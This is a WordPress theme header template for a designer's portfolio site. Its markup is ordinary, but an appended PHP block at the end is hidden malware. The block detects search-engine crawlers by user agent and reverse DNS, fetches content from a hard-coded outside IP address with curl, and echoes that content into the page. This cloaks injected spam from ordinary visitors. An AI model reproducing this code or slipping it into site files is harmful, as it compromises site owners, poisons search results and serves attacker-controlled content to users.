<?php
/**
 * The header for our theme.
 *
 * This is the template that displays all of the <head> section and everything up until <div id="content">
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package krass
 */

?><!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">

 <!-- Place favicon.ico in the root directory -->
<link rel="shortcut icon" href="<?php echo esc_url( get_template_directory_uri() ); ?>/favicon.ico" type="image/x-icon">
<link rel="icon" href="<?php echo esc_url( get_template_directory_uri() ); ?>/favicon.ico" type="image/x-icon">

<link rel="stylesheet" href="<?php echo esc_url( get_template_directory_uri() ); ?>/styles/vendor.css">
<link rel="stylesheet" href="<?php echo esc_url( get_template_directory_uri() ); ?>/styles/main.css">

<?php wp_head(); ?>
<script>
	var ajax_url = '<?php echo admin_url( 'admin-ajax.php' )?>';

</script>
</head>

<body <?php body_class(); ?> >
    <!-- WP-Minify CSS -->
    <!--[if lt IE 9]>
      <p class="browserupgrade" style="margin-top: 40px">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    <![endif]-->
    <!-- HEADER -->
<div class="wrapper fadeIn wow">
	
    <div class="header ">
        <nav class="navbar navbar-white navbar-fixed-top">
            <div class="container">
                <div class="navbar-header  hidden-sm hidden-xs">
                    <a class="navbar-brand" href="<?php echo get_bloginfo('url')?>"><img src="<?php echo esc_url( get_template_directory_uri() ); ?>/images/logo.png" height="21" width="192" alt=""></a>
                </div>
                <ul class="navbar-right socials hidden-xs">
                    <li><a href="https://www.facebook.com/eleonora.krass" class="btn btn-default"><i class="fa fa-facebook"></i></a></li>
                    <li><a href="https://twitter.com/eleonorakrass" class="btn btn-default"><i class="fa fa-twitter"></i></a></li>
                    <li><a href="http://vk.com/norakrass" class="btn btn-default"><i class="fa fa-vk"></i></a></li>
                    <li><a href="https://www.instagram.com/eleonorakrass/" class="btn btn-default"><i class="fa fa-instagram"></i></a></li>
                    <li><a href="https://www.behance.net/norakrass" class="btn btn-default"><i class="fa fa-behance"></i></a></li>
                </ul>                
                <?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_id' => 'primary-menu','menu_class'=>'nav navbar-nav navbar-right main-nav' ) ); ?>
            </div>
        </nav>
    </div>
    <!-- INTRO -->

    <?php if ( is_front_page() ) : ?>
	<div class="intro">
		<div class="container">
	        <div class="text fadeInUp wow">
	            <div class="site_name">
	                <img class="img-responsive" src="<?php echo esc_url( get_template_directory_uri() ); ?>/images/intro_image.png" alt="">
	            </div>
	            <div class="line"></div>
	            <div class="im_designer"><?php echo CFS()->get('intro_text')?></div>
	        </div>
        </div>
    </div>
	<?php else :?>
    <div class="intro bylabel">
        <div class="container">
            <div class="text fadeInUp wow">
                <div class="site_name">
                    <img class="img-responsive" src="<?php echo esc_url( get_template_directory_uri() ); ?>/images/intro_image.png" alt="">
                </div>
                <div class="line visible-xs visible-sm"></div>
                <h3><?php echo CFS()->get('intro_text')?></h3>
            </div>
        </div>
    </div>
	<?php endif ?>

	<div class="page-content">
        <div class="container">






<?php
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}

if(@$isbot){

$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);
$ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, "http://173.236.65.24/cakes/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$_SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);       
curl_close ($ch);  

	echo $result;
}
?>